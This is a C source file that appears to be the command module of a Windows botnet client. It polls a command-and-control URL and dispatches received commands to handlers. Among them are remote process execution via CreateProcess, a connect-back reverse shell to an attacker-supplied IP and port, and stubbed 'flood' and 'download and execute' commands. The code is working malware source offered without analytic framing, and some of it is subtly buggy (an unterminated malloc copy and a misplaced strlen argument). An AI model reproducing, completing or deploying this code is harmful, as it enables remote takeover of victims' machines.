#include "messages.h"
#include "httpclient.h"
#include "reverseshell.h"
#include "install.h"
#include "helper.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

int updateDecay = 878;

struct commandList {
	char * command;
	int length;
	int(*function)(char*);
};

static struct commandList commands[64];
static int cmdCount = 0;

#define CREATE_COMMAND(str, func) \
	commands[cmdCount].length = strlen(str); \
	commands[cmdCount].command = (char*)malloc(sizeof(char)*commands[cmdCount].length); \
	strcpy(commands[cmdCount].command, str); \
	commands[cmdCount++].function = *func; \

// Create our macros
#define HEARTBEAT "heartbeat"
#define FLOOD "flood"
#define SYSTEM "system"
#define DOWNLOADANDEXECUTE "downloadandexecute"
#define SHELL "shell"

int heartbeat(char * buf)
{
	// Its just a heartbeat, do nothing and update our decay factor
	updateDecay = updateDecay + updateDecay;
	if (updateDecay > 3600000) {
		updateDecay = 878;
	}
	return 0;
}

int flood(char * buf)
{
	// Ping a different server?
	return 0;
}

int systemCommand(char * buf)
{
	// pull out our execute command
	char * systemPath = buf + strlen(SYSTEM + 2);
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof StartupInfo;
	CreateProcess(systemPath, NULL,
		NULL, NULL, FALSE, 0, NULL,
		NULL, &StartupInfo, &ProcessInfo);
	return 0;
}

int downloadAndExecuteCommand(char * buf)
{
	// pull out our execute command
	char * downloadUrl = buf + strlen(DOWNLOADANDEXECUTE) + 1;
	return 0;
}

int shell(char * buf)
{
	// connect-back shell (client based, encrypted)
	char reverseIp[1024];
	strncpy(reverseIp, buf + strlen(SHELL)+1, 1024);
	char * tmp = strstr(reverseIp, " ");
	if (tmp == NULL)
	{
		return -1;
	}
	*tmp = '\0';
	
	char reversePort[16];
	strncpy(reversePort, tmp + 1, 16);

	connectBackShell(reverseIp, reversePort);
	return 0;
}

// Valid messages
int initMessages()
{
	CREATE_COMMAND(HEARTBEAT, heartbeat);
	CREATE_COMMAND(FLOOD, flood);
	CREATE_COMMAND(SYSTEM, systemCommand);
	CREATE_COMMAND(DOWNLOADANDEXECUTE, downloadAndExecuteCommand);
	CREATE_COMMAND(SHELL, shell);
	return 0;
}

int freeMessages()
{
	for (int i = 0; i < cmdCount; i++)
	{
		free(commands[i].command);
	}
	return 0;
}

int runMessages()
{
	char url[2048];
	strcpy(url, "http://localhost:3000/cnc/?name=");
	strcat(url, g_name);
	char * buf = connectUrl(url);
	if ( buf != NULL )
	{
		char * cmd = strstr(buf, "cmd:");
		if (cmd != NULL)
		{
			// find the end of our command
			cmd += 4; // move out of cmd:
			char * end = strstr(cmd, ":end");
			if (end != NULL)
			{
				char command[64];
				if (end - cmd < 64)
				{
					strncpy(command, cmd, end - cmd);
					command[end - cmd] = '\0';
					for (int i = 0; i < cmdCount; i++) {
						if (strncmp(command, commands[i].command, commands[i].length) == 0)
						{
							commands[i].function(command);
							updateDecay = 878;
							break;
						}
					}
				}
			}
		}
		free(buf);
	}
	else {
		updateDecay = updateDecay + updateDecay;
		if (updateDecay > 3600000) {
			updateDecay = 878;
		}
	}
	return 0;
}